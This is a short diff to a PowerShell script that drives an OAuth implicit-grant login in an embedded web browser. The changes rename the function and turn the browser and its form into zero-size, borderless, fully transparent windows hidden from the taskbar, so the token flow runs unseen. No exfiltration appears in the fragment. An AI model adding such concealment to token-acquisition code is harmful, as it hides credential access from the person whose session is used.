@@ -1,4 +1,4 @@
-function hi
+function Let-Me-See
 {
 #region - Implicit grant flow
 Add-Type -AssemblyName System.Windows.Forms
@@ -18,16 +18,16 @@ $OnDocumentCompleted = {
 		}
 	}
 	else{
-		[System.Console]::WriteLine($web.Document.Title)
+		#[System.Console]::WriteLine($web.Document.Title)
 		[System.Threading.Thread]::Sleep(10000)
 		$Form.Close()
 	}
 }
 
-$web = new-object System.Windows.Forms.WebBrowser -Property @{Width=400;Height=400;ScriptErrorsSuppressed=$true}#@{Width=0;Height=0;ScriptErrorsSuppressed=$true}
+$web = new-object System.Windows.Forms.WebBrowser -Property @{Width=0;Height=0;ScriptErrorsSuppressed=$true}
 $web.Add_DocumentCompleted($OnDocumentCompleted)
 
-$form = new-object System.Windows.Forms.Form -Property @{Width=400;Height=400;}#@{Width=0;Height=0;FormBorderStyle='None';ShowInTaskBar=$false;Opacity=0}
+$form = new-object System.Windows.Forms.Form -Property @{Width=0;Height=0;FormBorderStyle='None';ShowInTaskBar=$false;Opacity=0}
 $form.Add_Shown({$form.Activate()})
 $form.Controls.Add($web)
 
